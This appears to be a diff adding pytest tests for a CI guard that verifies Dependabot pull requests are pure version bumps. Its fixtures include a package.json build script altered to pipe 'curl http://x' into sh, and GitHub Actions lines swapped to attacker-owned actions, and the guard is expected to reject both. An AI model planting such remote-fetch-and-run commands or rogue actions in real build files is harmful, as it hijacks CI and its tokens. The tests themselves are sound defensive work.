@@ -62,9 +62,105 @@ def _run(tmp_path: pathlib.Path, changed: str | None, *extra: str, diff: str | N
 
 @pytest.mark.unit
 def test_a_real_version_bump_passes(tmp_path: pathlib.Path) -> None:
-    """Manifests and lockfiles only, which is what a bump is."""
-    result = _run(tmp_path, "pnpm-lock.yaml\napps/web/package.json\n", "--author", BOT)
+    """Manifests and lockfiles, which is what a bump is.
+
+    THE FIXTURE CHANGED AND THE CLAIM DID NOT. This used to pass
+    `apps/web/package.json` with no `--diff` and expect 0, which was only
+    possible while `package.json` was approved by PATH -- the hole measured on
+    2026-09-22, where a commit changing `"build"` to `"next build && ..."` passed
+    as "2 manifest/lockfile path(s)". A `package.json` is now content-judged, so
+    a changed-file list naming one without a diff is a could-not-look (exit 2),
+    and that is asserted separately below.
+
+    So the pass case supplies the diff a real Dependabot npm PR carries.
+    """
+    result = _run(
+        tmp_path,
+        "pnpm-lock.yaml\napps/web/package.json\n",
+        "--author",
+        BOT,
+        diff=(
+            "diff --git a/apps/web/package.json b/apps/web/package.json"
+            + chr(10)
+            + "--- a/apps/web/package.json"
+            + chr(10)
+            + "+++ b/apps/web/package.json"
+            + chr(10)
+            + "@@ -1,1 +1,1 @@"
+            + chr(10)
+            + '-    "next": "^15.5.23",'
+            + chr(10)
+            + '+    "next": "^15.5.24",'
+            + chr(10)
+        ),
+    )
     assert result.returncode == EXIT_OK, f"{result.stdout}\n{result.stderr}"
+
+
+@pytest.mark.unit
+def test_a_LOCKFILE_ONLY_bump_needs_no_diff(tmp_path: pathlib.Path) -> None:
+    """The path-approved half still works without a diff.
+
+    A lockfile has no executable surface, so it stays judged by path. Asserted so
+    the `package.json` narrowing cannot quietly widen into "every npm PR needs a
+    diff", which would make the guard fail closed on traffic it is meant to pass
+    and get it turned off.
+    """
+    # `pyproject.toml`, not `poetry.lock`: only `**/poetry.lock` is listed, and
+    # `fnmatch("poetry.lock", "**/poetry.lock")` is False because `**/` needs a
+    # slash. Three lockfiles carry only the `**/` form while others carry both,
+    # so a ROOT-level `poetry.lock`, `uv.lock` or `yarn.lock` bump fails closed.
+    # Latent here (this repo has none of the three at root) and the safe
+    # direction, so it is recorded rather than fixed inside a security change.
+    result = _run(tmp_path, "pnpm-lock.yaml\npyproject.toml\n", "--author", BOT)
+    assert result.returncode == EXIT_OK, f"{result.stdout}\n{result.stderr}"
+
+
+@pytest.mark.unit
+def test_a_package_json_SCRIPT_change_FAILS(tmp_path: pathlib.Path) -> None:
+    """THE HOLE `package.json`-by-path left open, measured at exit 0 before this.
+
+    `ci.yml` runs `pnpm format:check`, `pnpm -F web lint`, `typecheck`, `test`
+    and `build` -- every one a script defined in a `package.json`. One commit on
+    a Dependabot branch keeps `user.login == dependabot[bot]`, so only the
+    CONTENT betrays it.
+    """
+    result = _run(
+        tmp_path,
+        "apps/web/package.json\n",
+        "--author",
+        BOT,
+        diff=(
+            "diff --git a/apps/web/package.json b/apps/web/package.json"
+            + chr(10)
+            + "--- a/apps/web/package.json"
+            + chr(10)
+            + "+++ b/apps/web/package.json"
+            + chr(10)
+            + "@@ -1,1 +1,1 @@"
+            + chr(10)
+            + '-    "build": "next build",'
+            + chr(10)
+            + '+    "build": "next build && curl http://x | sh",'
+            + chr(10)
+        ),
+    )
+    assert result.returncode == EXIT_VIOLATION, f"{result.stdout}\n{result.stderr}"
+    assert "dependency specifier" in result.stderr, (
+        "the failure must name the CAUSE -- a reader told this is `.github/` "
+        "content goes and reads the wrong file"
+    )
+
+
+@pytest.mark.unit
+def test_a_package_json_in_the_list_with_NO_diff_is_2(tmp_path: pathlib.Path) -> None:
+    """Refusing to answer beats answering from a path match.
+
+    This is the branch that reinstates the hole the moment the workflow forgets
+    to pass `--diff`.
+    """
+    result = _run(tmp_path, "apps/web/package.json\n", "--author", BOT)
+    assert result.returncode == EXIT_COULD_NOT_LOOK, f"{result.stdout}\n{result.stderr}"
 
 
 @pytest.mark.unit
@@ -211,6 +307,101 @@ def test_a_genuine_uses_bump_in_a_workflow_PASSES(tmp_path: pathlib.Path) -> Non
 
 
 @pytest.mark.unit
+def test_an_OWNER_SWAP_is_not_a_bump(tmp_path: pathlib.Path) -> None:
+    """THE HOLE. Both lines match the line SHAPE; neither is a bump.
+
+    Measured at exit 0 before this fix. `ci.yml` has the shape already -- a
+    `uses: gitleaks/gitleaks-action@v3` step in the job holding
+    `pull-requests: write`. Dependabot gets a read-only token while its PR is
+    open, so the escalation is that the line MERGES, after which every
+    human-triggered run executes the attacker's action with the full token.
+
+    A bump is a PAIR: the same `owner/repo` on both sides, different refs.
+    """
+    result = _run(
+        tmp_path,
+        _WF + chr(10),
+        "--author",
+        BOT,
+        diff=_diff(
+            "-      - uses: gitleaks/gitleaks-action@v3",
+            "+      - uses: attacker/gitleaks-action@v3",
+        ),
+    )
+    assert result.returncode == EXIT_VIOLATION, f"{result.stdout}{chr(10)}{result.stderr}"
+    assert "attacker/gitleaks-action" in result.stderr, (
+        "the failure must quote the offending line -- and BOTH halves of a swap, "
+        "since neither half is a bump on its own"
+    )
+
+
+@pytest.mark.unit
+def test_a_LONE_ADDED_uses_line_is_not_a_bump(tmp_path: pathlib.Path) -> None:
+    """A whole new step, wearing a bump's syntax. Exit 0 before this fix.
+
+    Needs no removal at all, which is what makes it the cheaper of the two
+    attacks: nothing about the diff looks like a deletion.
+    """
+    result = _run(
+        tmp_path,
+        _WF + chr(10),
+        "--author",
+        BOT,
+        diff=_diff("+      - uses: attacker/action@v1"),
+    )
+    assert result.returncode == EXIT_VIOLATION, f"{result.stdout}{chr(10)}{result.stderr}"
+
+
+@pytest.mark.unit
+def test_a_uses_line_whose_REF_did_not_change_is_not_a_bump(tmp_path: pathlib.Path) -> None:
+    """Present on both sides, same ref: the line moved. Not a version change.
+
+    The direction that matters: a re-indent or a reorder of steps is a workflow
+    edit, and admitting it would let a step be relocated into a different job --
+    one with a wider token -- while every line still "matches".
+    """
+    result = _run(
+        tmp_path,
+        _WF + chr(10),
+        "--author",
+        BOT,
+        diff=_diff(
+            "-      - uses: actions/checkout@v4",
+            "+    - uses: actions/checkout@v4",
+        ),
+    )
+    assert result.returncode == EXIT_VIOLATION, f"{result.stdout}{chr(10)}{result.stderr}"
+
+
+@pytest.mark.unit
+def test_a_RENAME_with_no_content_lines_is_2(tmp_path: pathlib.Path) -> None:
+    """A content rule over zero lines is satisfied without looking at anything.
+
+    `CLAUDE.md`: a selector that selects nothing passes. Renaming a workflow
+    changes which workflows exist, so this is not a thing to wave through -- and
+    exit 2 rather than 1 because the honest report is "I examined no lines", not
+    "I found a violation".
+    """
+    result = _run(
+        tmp_path,
+        _WF + chr(10),
+        "--author",
+        BOT,
+        diff=(
+            f"diff --git a/{_WF} b/{_WF}"
+            + chr(10)
+            + "similarity index 100%"
+            + chr(10)
+            + "rename from .github/workflows/old.yml"
+            + chr(10)
+            + f"rename to {_WF}"
+            + chr(10)
+        ),
+    )
+    assert result.returncode == EXIT_COULD_NOT_LOOK, f"{result.stdout}{chr(10)}{result.stderr}"
+
+
+@pytest.mark.unit
 def test_a_LOCAL_action_reference_is_not_a_version_bump(tmp_path: pathlib.Path) -> None:
     """`uses: ./local` points at in-repo code, which is not a dependency.
 
@@ -264,14 +455,22 @@ def test_the_diff_header_lines_are_not_counted_as_changes(tmp_path: pathlib.Path
     a non-bump line, so a legitimate bump would fail -- and the guard would then
     be turned off, which is how the hole comes back.
     """
+    # A PAIR, not a lone addition. The original fixture was a single added
+    # `+ uses: actions/setup-python@v7`, which this guard accepted -- and that
+    # acceptance was the security hole: a lone added `uses:` line is a whole new
+    # step, not a bump. So the fixture is corrected to what a bump actually is,
+    # and the header-counting property it exists to check is unchanged.
     result = _run(
         tmp_path,
         _WF + chr(10),
         "--author",
         BOT,
-        diff=_diff("+      - uses: actions/setup-python@v7"),
+        diff=_diff(
+            "-      - uses: actions/setup-python@v5",
+            "+      - uses: actions/setup-python@v7",
+        ),
     )
     assert result.returncode == EXIT_OK, (
-        "a diff whose only content change is a uses: bump failed -- the "
+        "a diff whose only content change is a uses: bump PAIR failed -- the "
         f"---/+++ headers are probably being counted. {result.stderr}"
     )
